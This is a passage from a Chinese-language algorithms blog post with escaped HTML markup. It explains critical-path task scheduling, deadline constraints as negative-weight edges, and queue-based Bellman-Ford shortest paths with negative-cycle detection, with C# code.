            &lt;span&gt;int&lt;/span&gt; s = &lt;span&gt;2&lt;/span&gt; * N, t = &lt;span&gt;2&lt;/span&gt; * N + &lt;span&gt;1&lt;/span&gt;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;起点和终点&lt;/span&gt;
            &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; N; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;[] a = strs[i].Split(&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; duration = Double.Parse(a[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
                G.AddEdge(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; DirectedEdge(i,i+N,duration));&lt;span&gt;//&lt;/span&gt;&lt;span&gt;任务起点指向任务终点&lt;/span&gt;
                G.AddEdge(&lt;span&gt;new&lt;/span&gt; DirectedEdge(s,i,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;));
                G.AddEdge(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; DirectedEdge(i+N,t,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;));

                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; j = &lt;span&gt;1&lt;/span&gt;; j &amp;lt; a.Length; j++&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; successor =&lt;span&gt; Int32.Parse(a[j]);
                    G.AddEdge(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; DirectedEdge(i+N,successor,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;));
                }
            }

            AcyclicSP lp &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; AcyclicSP(G,s);
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; N; i++&lt;span&gt;)
                Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{i} 开始时间:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;+&lt;span&gt;lp.DistTo(i));
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;t distTo:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +&lt;span&gt; lp.DistTo(t));

        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 　　这里实现的任务调度问题的关键路径方法将问题归约为寻找无环加权有向图的最长路径问题。它会根据任务调度问题的描述用关键路径的方法构造一幅加权有向图，然后使用 AcylicLP 找到图中的最长路径，最后打印出各条最长路径的长度，&lt;strong&gt;也就是正好是每个任务的开始时间&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201224205516891-1072403590.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　&lt;strong&gt;解决优先级限制下的并行任务调度问题的关键路径法所需的时间为线性级别&lt;/strong&gt;。为什么 CPM 类能解决问题？算法的正确性依赖于两个因素。首先，在相应的有向无环图中，每条路径都是由任务的起始顶点和结束顶点组成的并由权重为零的优先级限制条件的边分隔 —— 从起点 s 到任意顶点 v 的任意路径的长度都是任务 v 的开始 / 结束时间的下限，因为这已经是在同一台处理器上顺序完成这些任务的最优的排列顺序了。因此，从起点 s 到终点 t 的最长路径就是所有任务的完成时间的下限。第二，由最长路径得到的所有开始和结束时间都是&lt;strong&gt;可行&lt;/strong&gt;的 —— 每个任务都只能在优先级限制指定的先导任务完成之后开始，因为它的开始时间就是顶点到它的起始顶点的最长路径的长度。因此，从起点 s 到 终点 t 的最长路径长度就是所有任务完成时间的上限。&lt;/p&gt;



&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　相对最后期限限制下的并行任务调度&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　一般的最后期限（deadline）都是相对于第一个任务的开始时间而言的。假设在任务调度问题中加入一种新类型的限制，需要某个任务必须在指定的时间点之前开始，即指定和另一个任务的开始时间的相对时间。这种类型的限制条件在争分夺秒的生产线上以及许多其他应用中都很常见，但它也会使得任务调度问题更难解决。如下表，假设要在前面的示例中加入一个限制条件，使 2 号任务必须在 4 号任务启动后的 12 个时间单位之内开始。实际上，在这里最后期限限制的是 4 号任务的开始时间：它的开始时间不能早于 2 号任务开始 12 个时间单位。在示例中，调度表中有足够的空档来满足这个最后期限限制：我们可以令 4 号任务开始于 111 时间，即 2 号任务计划开始时间前的 12 个时间单位处。需要注意的是，如果 4 号任务耗时很长，这个修改可能会延长整个调度计划的完成时间。同理，如果再添加一个最后期限的限制条件，令 2 号任务必须在 7 号任务启动后的 70 个时间单位内开始，还可以将 7 号任务的开始时间调整到 53，这样就不用修改 3 号任务和 8 号任务的计划开始时间。但是如果继续限制 4 号任务必须在 0 号任务启动后的 80 个时间单位内开始，那么就&lt;strong&gt;不存在可行&lt;/strong&gt;的调度计划了：限制条件 4 号任务必须在 0 号任务启动后的 80 个时间单位内开始以及 2 号任务必须在 4 号任务启动后的 12 个时间单位之内开始，意味着 2 号任务必须在 0 号任务启动后的 93 个时间单位之内开始，但因为存在任务链 0（41 个时间单位）-&amp;gt; 9（29 个时间单位）-&amp;gt; 6（21 个时间单位）-&amp;gt; 8（32 个时间单位）-&amp;gt; 2，2 号任务最早也只能在 0 号任务启动后的 123 个时间单位之内开始。&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201224203432416-1315256607.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;向任务调度问题中添加的最后期限限制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201224203601554-1401915038.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　&lt;strong&gt;相对最后期限限制下的并行任务调度问题是一个加权有向图中的最短路径问题（可能存在环和负权重边）&lt;/strong&gt;。 根据任务调度的描述构造加权有向图，为每条最后期限限制添加一条边：&lt;strong&gt;如果任务 v 必须在任务 w 启动后的 d 个单位时间内开始，则添加条从 v 指向 w 的负权重为 d 的边。将所有边的权重取反即可将该问题转化为一个最短路径问题&lt;/strong&gt;。如果存在&lt;strong&gt;可行的调度&lt;/strong&gt;方案，证明也就完成了。判断一个调度方案是否可行也是计算的一部分。&lt;/p&gt;

&lt;p&gt;　　上面的示例说明了负权重的边在实际应用的模型中也能起到重要作用。它说明，如果能够有效解决负权重边的最短路径问题，那就能够找到相对最后期限限制下的并行任务调度问题的解决方案。&lt;strong&gt;之前学过的算法都无法完成这个任务&lt;/strong&gt;：Dijkstra 算法只适用于正权重的边，AcylicSP 算法要求有向图是无环的。下面解决含有负权重且不一定是无环的有向图中的最短路径问题。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　6.一般加权有向图中的最短路径问题&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　上面讨论的最后期限限制下的任务调度问题告诉我们负权重的边不仅仅是一个数学问题。相反，它能够极大地扩展解决最短路径问题模型的应用范围。接下来，考虑既可能含有环也可能含有负权重的边的加权有向图中的最短路径算法。&lt;/p&gt;
&lt;p&gt;　　开始之前，先学习一下这种有向图的基本性质以及&lt;strong&gt;更新我们对最短路径的认识&lt;/strong&gt;。下图展示的是负权重的边对有向图中的最短路径的影响。也许最明显的改变就是当存在负权重的边时，权重较小的路径含有的边可能会比权重较大的路径更多。在只存在正权重的边时，我们的重点在于寻找近路；但当存在负权重的边时，我们可能会为了经过负权重的边而&lt;strong&gt;绕远&lt;/strong&gt;。&lt;strong&gt;这种效应使得我们要将查找 “最短” 路径的感觉转变为对算法本质的理解。&lt;/strong&gt;因此需要抛弃直觉并在一个简单，抽象的层面上考虑这个问题。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201225073903045-360431892.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　&lt;strong&gt;尝试一&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　　第一个想法是先找到权重最小（最小负值）的边，然后将所有边的权重加上这个负值的绝对值，这样原有向图就转变成了一幅不含有负权重边的有向图。但这种做法不会解决任何问题，&lt;strong&gt;因为新图中的最短路径和原图中的最短路径毫无关系。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;尝试二 &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　　第二个想法是改造 Dijkstra 算法。这种算法最根本的缺陷在于原算法的基础在于根据距离起点的远近依次检查路径，添加一条边会使路径变得更长。但添加任意负权重的边只会使得路径更短。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;负权重的环&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　当我们在研究含有负权重边的有向图时，如果该图中含有一个&lt;strong&gt;权重为负的环&lt;/strong&gt;，那么最短路径的概念就失去意义了。如下图，除了边 5 -&amp;gt; 4 的权重为 -0.66 外，它和前面的示例完全相同。这里，环 4-&amp;gt; 7 -&amp;gt; 5 -&amp;gt; 4 的权重为：&lt;/p&gt;
&lt;p&gt;　　0.37 + 0.28 - 0.66  = -0.01；&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;我们只要围着这个环兜圈子就能得到权重任意短的路径！&lt;/strong&gt;注意，有向环的所有边的权重并不一定都必须是负的，只要权重之和是负的即可。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201226091609206-141801129.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　&lt;strong&gt;定义&lt;/strong&gt;：加权有向图中的负权重环是一个总权重为负的有向环。&lt;/p&gt;

&lt;p&gt;　　现在，假设从 s 到可达的某个顶点 v 的路径上的某个顶点在一个负权重环上。在这种情况下，从  s 到 v 的最短路径是不可能存在的，因为可以利用这个负权重环构造权重任意小的路径。换句话说，在负权重环存在的情况下，最短路径问题是没有意义的。&lt;/p&gt;

&lt;p&gt;　　当且仅当加权有向图中至少存在一条从 s 到 v 的有向路径且所有从 s 到 v 的有向路径上的任意顶点都不存在于任何负权重环中时，s 到 v 的最短路径才是存在的。&lt;/p&gt;
&lt;p&gt;　　注意，要求最短路径上的任意顶点都不存在于负权重环中意味着最短路径是简单的，而且与正权重边的图一样都能够得到此类顶点的最短路径树。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;尝试三&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　无论是否存在负权重环，从 s 到可达的其他顶点的一条最短的简单路径都是存在的。为什么不定义最短路径以方便寻找呢？但是，已知解决这个问题的最好算法在最坏情况下所需的时间是指数级别的（后面会降到）。一般来说，这种问题太难了，只会研究它的简单版本。&lt;/p&gt;
&lt;p&gt;　　因此，&lt;strong&gt;一个定义明确且可以解决加权有向图最短路径的算法要能够&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt; 　　1.对于从起点不可达的顶点，最短路径为正无穷；&lt;/p&gt;
&lt;p&gt;　　2.对于从起点可达但路径上的某个顶点属于一个负权重环的顶点，最短路径为负无穷；&lt;/p&gt;
&lt;p&gt;　　3.对于其他所有顶点，计算最短路径的权重。&lt;/p&gt;

&lt;p&gt;　　从文章的开始到现在，我们为最短路径问题加上了各种限制，使得我们能够找到解决相应问题的办法。首先，我们不允许负权重边的存在；其次不接受有向环。现在我们放宽所有这些条件并重点解决一般有向图中的问题。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;负权重环的检测&lt;/strong&gt;。 给定的加权有向图中含有负权重环吗？如果有，找到它。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;负权重环不可达时的单点最短路径&lt;/strong&gt;。给定一幅加权有向图和一个起点 s 且从 s 瓦法到达任何负权重环。是否存在一条从 s 到给定的顶点 v 的有向路径？如果有，找出最短的那条路径。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;总结&lt;/strong&gt;。尽管&lt;strong&gt;在含有环的有向图中最短路径是一个没有意义的问题&lt;/strong&gt;，而且也无法有效解决在这种有向图中高效找出最短简单路径的问题，在实际应用中仍然需要能够识别其中的负权重环。例如，在最后期限限制下的任务调度问题中，负权重环的出现可能相对较少；限制条件和最后期限都是从现实世界中的实际限制得来的，因此负权重环大多可能来自于问题陈述中的错误。找出负权重环，改正相应的错误，找到没有负权重环问题的调度方案才是解决问题的正确方式。在其他情况下，找到负权重环就是计算的目标。&lt;/p&gt;

&lt;p&gt;　　Bellman-Ford 算法能够有效解决这些问题并且同样适用于正权重边的有向图。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;Bellman-Ford 算&lt;/strong&gt;法。在任意含有 V 个顶点的加权有向图中给定起点 s  ，从 s 无法到达任何负权重环，以下算法能够解决其中的单点最短问题：将 distTo[s] 初始化为 0 ，其他 distTo[ ] 元素初始化为无穷大。&lt;span&gt;&lt;strong&gt;以任意顺序放松有向图所有边，重复 V 轮。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;这个方法非常通用，因为它没有指定边的放松顺序。下面将注意力集中在一个通用性稍逊的方法上，其中只放松从任意顶点指定的所有边（任意顺序）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; pass = &lt;span&gt;0&lt;/span&gt;; pass &amp;lt; G.V(); pass++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (v = &lt;span&gt;0&lt;/span&gt;; v &amp;lt; G.V(); v++&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (DirectedEdge e &lt;span&gt;in&lt;/span&gt;&lt;span&gt; G.Adj(v))
                        Relax(e);
                }
            }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　它总是会放松 VE 条边且只需稍作修改即可使算法在一般情景下更高效。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　基于队列的 Bellman-Ford 算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　其实，根据经验我们很容易知道在任意一轮中许多边的放松都不会成功：只有上一轮中的 distTo[ ] 值发生变化的顶点指出的边才能够改变其他 distTo[ ] 元素的值。为了记录这样的顶点，我们使用了一条 FIFO 队列。算法在处理正权重标准样图中进行的操作轨迹如下图，在图中，左侧是每一轮中队列中的有效顶点（红色），紧接着是下一轮中的有效顶点（黑色）。首先将起点加入队列，然后按照以下步骤计算最短路径树：&lt;/p&gt;
&lt;p&gt;　　1.放松边 1 -&amp;gt; 3 并将顶点 3 加入队列；&lt;/p&gt;
&lt;p&gt;　　2.放松边 3 -&amp;gt; 6 并将顶点 6 加入队列；&lt;/p&gt;
&lt;p&gt;　　3.放松边 6 -&amp;gt; 4, 6 -&amp;gt; 0 和 6 -&amp;gt; 2 并将顶点 4,0 和 2 加入队列；&lt;/p&gt;
&lt;p&gt;　　4.放松边 4 -&amp;gt; 7，4 -&amp;gt; 5 并将顶点 7 和 5 加入队列。放松已经失效的边 0 -&amp;gt; 4 和 0 -&amp;gt; 2。然后再放松边 2 -&amp;gt; 7 （并重新为 4 -&amp;gt; 7 着色）。&lt;/p&gt;
&lt;p&gt;　　5.放松边 7 -&amp;gt; 5 （并重新为 4 -&amp;gt; 5 着色）但不将顶点 5 加入队列（它已经在队列中了）。放松已经失效的边 7 -&amp;gt; 3。然后放松已经失效的边 5 -&amp;gt; 1， 5 -&amp;gt; 4 和 5 -&amp;gt; 7。此时队列为空。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201228074536806-246599971.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　&lt;strong&gt;实现&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　根据上面的描述实现 Bellman-Ford 算法所需的代码很少，它基于以下两种其他的数据结构：&lt;/p&gt;
&lt;p&gt;　　1.一条用来保存即将被放松的顶点的队列 Queue；&lt;/p&gt;
&lt;p&gt;　　2.一个由顶点索引的 bool 数组 OnQ[ ] ，用来指示顶点是否已经存在于队列中，以防止将顶点重复加入队列。&lt;/p&gt;

&lt;p&gt;　　首先，将起点 s 加入队列中，然后进入一个循环，其中每次都从队列中取一个顶点并将其放松。要将一个顶点插入队列，需要修改之前的 Relax 方法实现，以便将被成功放松的边所指向的顶点加入队列中。这些数据结构能够保证：&lt;/p&gt;
&lt;p&gt;　　1.队列中不会出现重复的顶点；&lt;/p&gt;
&lt;p&gt;　　2.在某一轮中，改变了 edgeTo[ ] 和 distTo[ ] 的值得所有顶点都会在下一轮中处理。&lt;/p&gt;
&lt;p&gt;　　要完整地实现该算法，我们就需要保证在 V 轮后算法能够终止。实现它的一种方法是显式记录放松的轮数。下面的代码使用了另一种算法，后面详细说：它会在有向图的 edgeTo[ ] 中检测是否存在负权重环，如果找到则结束运行。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BellmanFordSP
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;[] distTo;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从起点到某个顶点的路径长度&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; DirectedEdge[] edgeTo;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从起点到某个顶点的最后一条边&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;[] onQ;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;该顶点是否存在于队列中&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; Queue&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt; queue;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;正在被放松的顶点&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; cost;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;relax 的调用次数&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; IEnumerable&amp;lt;DirectedEdge&amp;gt; cycle;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;edgeTo[] 中的是否有负权重环&lt;/span&gt;

        &lt;span&gt;public&lt;/span&gt; BellmanFordSP(EdgeWeightedDigraph G,&lt;span&gt;int&lt;/span&gt;&lt;span&gt; s)
        {
            distTo &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt;[G.V()];
            edgeTo &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DirectedEdge[G.V()];
            onQ &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt;[G.V()];
            queue &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Queue&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; v = &lt;span&gt;0&lt;/span&gt;; v &amp;lt; G.V(); v++&lt;span&gt;)
                distTo[v] &lt;/span&gt;=&lt;span&gt; Double.MaxValue;
            distTo[s] &lt;/span&gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            queue.Enqueue(s);
            onQ[s] &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (queue.Count != &lt;span&gt;0&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span&gt;HasNegativeCycle())
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; v =&lt;span&gt; queue.Dequeue();
                onQ[v] &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                Relax(G,v);
            }
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;负权重环的检测&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; HasNegativeCycle()
        {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NotImplementedException();
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Relax(EdgeWeightedDigraph G, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; v)
        {
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (DirectedEdge e &lt;span&gt;in&lt;/span&gt;&lt;span&gt; G.Adj(v))
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; w =&lt;span&gt; e.To();
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (distTo[w] &amp;gt; distTo[v] +&lt;span&gt; e.Weight())
                {
                    distTo[w] &lt;/span&gt;= distTo[v] +&lt;span&gt; e.Weight();
                    edgeTo[w] &lt;/span&gt;=&lt;span&gt; e;
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;onQ[w])
                    {
                        queue.Enqueue(w);
                        onQ[w] &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                    }
                }

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (cost++ % G.V() == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
                    FindNegativeCycle();
            }
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;查找负权重环&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; FindNegativeCycle()
        {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NotImplementedException();
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　Relax 方法将成功放松的边指向的所有顶点加入到一条 FIFO 队列中（队列中不出现重复的顶点）并周&lt;strong&gt;期性地检查 edgeTo[ ] 表示的子图中是否存在负权重环&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;对于任意含有 V 个顶点的加权有向图和给定的起点  s ，在最坏情况下基于队列的 Bellman-Ford 算法解决最短路径问题（或者找到从 s 可达的负权重环）所需的时间与 EV 成正比，空间和 V 成正比。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　如果不存在从 s 可达的负权重环，算法会在进行 V-1 轮放松操作后结束（因为所有最短路径含有的边数都小于 V-1）。如果的确存在一个从 s 可达的负权重环，那么队列永远不可能为空。在第 V 轮放松之后，edgeTo[ ] 数组必然会包含一条含有一个环的路径（从某个顶点 w 回到它自己）且该环的权重必然是负的。因为 w 会在路径上出现两次且 s 到 w 的第二次出现处的路径长度小于 s 到 w 的第一次出现的路径长度。在最坏情况下，该算法的行为和通用算法相似并会将所有的 E 条边全部放松 V 轮。&lt;/p&gt;

&lt;p&gt;　　基于队列的 Bellman-Ford 算法对于相同的问题比较路径长度的次数少于 Disjkstra 算法。 &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　负权重的边&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　下图显示了  Bellman-Ford 算法在处理含有负权重边的有向图的轨迹。首先将起点加入队列 queue ，然后按照以下步骤计算最短路径树。&lt;/p&gt;
&lt;p&gt;　　1.放松边 0 -&amp;gt; 2 和 0 -&amp;gt; 4 并将顶点 2，4 加入队列。&lt;/p&gt;
&lt;p&gt;　　2.放松边 2 -&amp;gt; 7 并将顶点 7 加入队列。放松边 4 -&amp;gt; 5 并将顶点 5 加入队列。然后放松失效的边 4 -&amp;gt; 7。&lt;/p&gt;
&lt;p&gt;　　3.放松边 7 -&amp;gt; 3 和 5 -&amp;gt; 1 并将顶点 3 和 1 加入队列。放松失效的边 5 -&amp;gt; 4 和 5 -&amp;gt; 7 。&lt;/p&gt;
&lt;p&gt;　　4.放松边 3 -&amp;gt; 6 并将顶点 6 加入队列。放松失效的边 1 -&amp;gt; 3 。&lt;/p&gt;
&lt;p&gt;　　5.放松边 6 -&amp;gt; 4 并将顶点 4 加入队列。这条负权重的边使得到顶点 4 的路径变短，因此它的边需要被再次放松。从起点到顶点 5 和 1 的距离已经失效并会在下一轮修正。&lt;/p&gt;
&lt;p&gt;　　6.放松边 4 -&amp;gt; 5 并将顶点 5 加入队列。放松失效的边 4 -&amp;gt; 7 。&lt;/p&gt;
&lt;p&gt;　　7.放松边 5 -&amp;gt; 1 并将顶点 1 加入队列。放松失效的边 5 -&amp;gt; 4 和 5 -&amp;gt; 7 。&lt;/p&gt;
&lt;p&gt;　　8.放松失效的边 1 -&amp;gt; 3 。队列为空。&lt;/p&gt;
&lt;p&gt;　　在这个例子中，最短路径树就是一条从顶点 0 到顶点 1 的路径。从顶点 4，5 和 1 指出的所有边都被放松了两次。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201230195613505-109553702.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;




&lt;p&gt;&lt;strong&gt;　　负权重环的检测&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　实现 BellmanFordSP 会检测负权重环来避免陷入无限的循环中。我们也可以将这段检测代码独立出来使得用例可以检查并得到负权重环。在 BellmanFordSP 的构造函数运行之后，在将所有边放松 V 轮之后当且仅当队列非空时有向图中才存在从起点可达的负权重环。如果是这样， edgeTo[ ] 数组所表示的子图必然含有这个负权重环。我们修改&lt;a href=&quot;https://www.cnblogs.com/afei-24/p/13951947.html&quot; target=&quot;_blank&quot;&gt;有向图&lt;/a&gt;中的 DirectedCycle 类来在加权有向图中寻找环。这种检查的成本分为以下几个部分：&lt;/p&gt;
&lt;p&gt;　　1.添加一个变量 cycle 和一个私有函数 FindNegativeCycle 。如果找到负权重环，该方法会将 cycle 的值设为含有环中所有边的一个迭代器（如果没有找到则设为 null）。&lt;/p&gt;
&lt;p&gt;　　2.每调用 V 次 Relax 方法后即调用 FindNegativeCycle 方法。&lt;/p&gt;
&lt;p&gt;　　这种方法能够保证构造函数中的循环必然终止。另外，用例可以调用  HasNegativeCycle 来判断是否存在从起点可达的负权重环。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;查找负权重环&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; FindNegativeCycle()
        {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; V =&lt;span&gt; edgeTo.Length;
            EdgeWeightedDigraph spt;
            spt &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EdgeWeightedDigraph(V);
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; v = &lt;span&gt;0&lt;/span&gt;; v &amp;lt; V; v++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (edgeTo[v] != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                    spt.AddEdge(edgeTo[v]);
            }

            EdgeWeightedCycleFinder cf;
            cf &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EdgeWeightedCycleFinder(spt);

            cycle &lt;/span&gt;=&lt;span&gt; cf.Cycle();
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;负权重环的检测&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; HasNegativeCycle()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; cycle != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;DirectedEdge&amp;gt;&lt;span&gt; NegativeCycle()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; cycle;
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

